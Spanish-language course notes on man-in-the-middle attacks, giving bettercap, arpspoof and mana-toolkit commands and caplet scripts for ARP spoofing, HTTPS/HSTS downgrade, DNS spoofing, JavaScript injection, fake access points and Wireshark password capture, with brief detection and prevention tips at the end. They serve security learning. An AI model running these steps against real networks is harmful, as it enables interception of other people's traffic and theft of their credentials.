MITM ATTACKS:

ARP Spoofing (ARPSPOOF O BETTERCAP):
ARP address resolution protocol se usa para mapear ip direcionas a los mac
para ver la tabla arp
	arp -a 
el ataque consiste en explotar el protocolo arp para que se rescriba la tabla arp en el cliente y ruter para que uno piense que 
somo el ruter y otro que somos la victima de esta forma podemos interseptar los datos
ARPSPOOF:
	echo 1 > /proc/sys/net/ipv4/ip_forward
	arpspoof -i [interface wlan0] -t [clientIP] [gatewayIP]
	arpspoof -i [interface] -t [gatewayIP] [clientIP]
si coremos arp-a en el ordenador victima veremos que la mac de los ips esta cambiada
BETTERCAP:
	ifconfig
	bettercap -iface eth0 
in bettercap console:
	net.probe on 
descubre cliente conectados a la net tambien activa net.recon que crea una lista con ips y macs por lo que podemos hacer
	net.show
arp spoof atack
	help arp.spoof
	set arp.spoof.fullduplex true
	set arp.spoof.targets x.x.x.x
	arp.spoof on
para que funcione net.probe y net.recon tienen que estar funcionando
para capturar todos los datos que fluyen por el ordenador nesecitamos net.sniff
	net.sniff on
ahora podemos ver la informacion enviada en http

script para bettercap podemos poner todos estos comandos en un archivo de texto y guardarlo con extencion .cap para ejecutarlos simultaneamente la proxima vez
	bettercap -iface eth0 -caplet file.cap

Bypassing HTTPS:
La forma mas simple es downgrade https to http para eso se usa ssl strip como metodo avanzado pero en bettercap tenemos un caplet que nos ayuda con eso 
pero no cambia todos los https a http
descargamos el archivo hstshijack y lo movemos a ctrl+L /usr/share/bettercap/caplets/ antes eliminamos el que existe en la carpeta
para que esto funcione antes de correr net.sniff on coremos 
	set net.sniff.local true
para capturar datos que incluso sean locales porque despues de usar el caplet la informacion aparecera como si fuera enviada desde nuestro ordenador

script.cap
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.targets x.x.x.x,x.x.x.x
arp.spoof on
set net.sniff.local true
net.sniff on

Bypassing HTTPS
	bettercap -iface eth0 -caplet file.cap
para ver todos los coplets
	caplets.show
usamos el caplet
	hstshijack/hstshijack

Bypassing HSTS
la forma de sobrepasar HTST es hacer que el navegador carge una web diferente con algun caracter en el dominio cambiado
realizamos el ataque igual que antes y si la victima entra usando el buscador en una web capturamos su contraseña

DNS Spoofing:
DNS sever convierte los nombres de dominio a los ips de los servidores donde se encuentra la pagina hackeando este podemos
devolver nuestra web local en vez de la que solicitan
	service apache2 start
	ifconfig
podemos ir a nuestra ip para ver la pagina basica y modificar su html
	bettercap -iface eth0 -caplet file.cap
	help dns.spoof
	set dns.spoof.all true
	set dns.spoof.domains zsecurity.org,*.zsecurity.org
esto funcionara con todas las webs incluso si usan https pero no con hsts podemos usarlo para cambiar la pagina de login
inllectar codigo malicioso o proporcinar actualizaciones falsas

Injecting Javascript Code:
raplace links, replace images, insert html images, hook target browsers to explotation frameworks 
en hstshijack.cap espesificamos el archivo de js en payloads podemos espesificar vaios archivos separando con "," y indicando el path
el codigo se ejecutara en http, https y en hsts solo si se busca a travez del navegador
	bettercap -iface eth0 -caplet file.cap
	hstshijack/hstshijack

WIRESHARK:
se usa para analizar el trafico que corre por tu interface
cuando somos MITM usamos wireshark para capturar y analizar el trafico
si usamos ierodump o otros programas para capturar trafico podemos abrir el archivo en wireshark
selecionamos el interface que usamos para realizar el ataque
	bettercap -iface eth0 -caplet file.cap
	hstshijack/hstshijack
y selecionamos el interface en el programa wireshark para analizar el trafico
podemos filtrar todo el trafico para ver el http lo mas importante de los aquetes es el Hypertext transfer protocol 
basicamente la informacion enviada
podemos pulsar boton derecho follow http stream para ver la respuesta al request
para descubrir usuarios y contraseñas buscamos POST vemos si hay /login
podemos pulsar CTRL+F nos abre una barra donde podemos buscar informacion en los paquetes capturados
en bettercap script podemos espesificar que guarde toda la informacion a un archivo que luego podemos analizar
	
script.cap
net.probe on
net.recon on
set arp.spoof.fullduplex true
set arp.spoof.targets x.x.x.x,x.x.x.x
arp.spoof on
set net.sniff.local true
set net.sniff.output /root/capturefile.cap
net.sniff on

Creating a Fake Access Point
Necesitamos un ordenador con internet y un adaptador wifi que pueda repartir internet
usamos mana-toolkit que se usa para sobrepasar https capturar datos, crear puntos de haceso....
mana tiene 3 scripts prinsipales pero el que vamos a usar es start-nat-simple que cre AP con acceso a internet
	leafpad /etc/mana-toolkit/hostapd-mana.conf
modificamos el interface a nuestro adaptador y ssid que es con que nombre aparecera el punto de aceso
	leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
upstream ponemos el interface que tiene aceso a internet, phy el adaptador que repartira la conexion
	bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
ahora podemos usar wireshark o man in the midle F para analizar el trafico tenemos que usar la interface 
que esta repartiendo la señal

Detectar Arp Poisoning:
comprovamos que los mac de las ips son unicos
	arp -a
podemos usar la heramienta XArp

Detectar actividades sospechosas en la red con Wireshark:
edit - preferences -protocols -arp - detect ARP requests
de esta forma podemos detectar si algien intenta descubrir todos los dispositivos en la red
si vemos que una ip envia varios arp request a todos los ips esque esta escaneando la red
analize - expert information - (vemos warning con duplicate ip y ARP packet storm en note)
Otra forma es poner tablas Arp Estaticas

Para prevenir el ataque MITM:
Usamos HTTPS evrywher plugin
Usamos VPN

